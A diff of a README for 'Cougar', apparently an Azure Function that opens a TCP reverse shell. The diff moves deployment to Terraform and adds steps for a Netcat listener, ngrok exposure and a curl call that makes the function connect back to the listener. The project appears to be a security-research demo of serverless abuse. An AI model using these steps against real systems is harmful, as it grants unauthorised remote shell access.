@@ -4,46 +4,59 @@ Cougar is a C# function that can be deployed to the Azure to establish a TCP rev
 
 ## Installing Prerequisites
 
-* [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local)
+* [.NET Core 3.1 SDK](https://dotnet.microsoft.com/download)
+* [Terraform](https://learn.hashicorp.com/terraform/getting-started/install.html)
 
 ## Deploying the Function
 
-Requires the Resource Group, Function App (.NET Core, Linux OS), App Service Plan, App Insights, and Storage Account to be created in US West.
-
 ```bash
-az ad sp create-for-rbac -n "PumaPreyCougar"
+cd src
+dotnet restore
+dotnet build
+dotnet publish
+cd ../terraform
+terraform init
+export TF_VAR_UniqueString=$(uuidgen | cut -b 25-36 | awk '{print tolower($0)}') # Save this value for future sessions.
+terraform plan
+terraform apply
 ```
-
-```bash
-func azure functionapp publish pumapreycougar
-```
-
-Manually configure the function to run under the SP created above.
-
-Click on function app. Select platform features. Click on identity. Assign function to the service principal.
-
-TODO: TF all the things for the consumption plan.
-
-https://github.com/markgossa/HashiTalk1-TerraformModules
-https://www.hashicorp.com/resources/provision-serverless-infrastructure-terraform-azure-pipelines
 
 ## Testing in Azure
 
-Using the Invoke URL returned from the publish command above:
+Set up a TCP listener for your reverse shell, such as with [Netcat](http://netcat.sourceforge.net/):
 
 ```bash
-curl "<INSERT INVOKE URL>&ip=[ip-address]&port=[port]"
+nc -l 4444
 ```
+
+To make your listener accessible from the public internet, consider using a service like [ngrok](https://ngrok.com/):
+
+```bash
+ngrok tcp 4444
+```
+
+Retrieve the API key in the Azure Portal by searching for "Function App", clicking on the new Function App resource, clicking "Manage", and clicking "Click to show" next to the default function key.
+
+Invoke your function, supplying your connection details and API key:
+
+```bash
+curl "https://cougar$TF_VAR_UniqueString.azurewebsites.net/api/Cougar?host=YOUR_PUBLICLY_ACCESSIBLE_HOST&port=YOUR_PORT_NUMBER&code=YOUR_API_KEY"
+```
+
+Your listener will now act as a reverse shell for the duration of the function invocation.
 
 ## Teardown
 
 ```bash
-az group delete --name pumaprey-cougar
+terraform destroy
 ```
 
 ## Running Locally
 
+Install [Azure Functions Core Tools](https://docs.microsoft.com/en-us/azure/azure-functions/functions-run-local) and run the following:
+
 ```bash
+cd src
 dotnet restore
 dotnet build
 func start
